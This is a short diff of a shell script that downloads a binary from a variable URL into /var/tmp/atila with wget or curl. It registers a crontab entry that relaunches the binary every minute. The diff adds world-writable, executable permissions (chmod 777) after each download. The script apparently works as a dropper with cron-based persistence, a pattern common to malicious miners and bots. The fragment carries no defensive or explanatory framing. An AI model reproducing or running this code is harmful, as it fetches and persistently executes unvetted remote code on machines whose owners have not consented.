@@ -45,6 +45,9 @@ if [ $wget_ok -eq 1 ] ; then
 
 wget $url -O /var/tmp/atila
 
+cd /var/tmp ; chmod 777 atila
+
+
 (crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
 
 
@@ -52,6 +55,9 @@ else
 
 
 curl  -L  $url -o /var/tmp/atila
+
+cd /var/tmp ; chmod 777 atila
+
 
 (crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
 
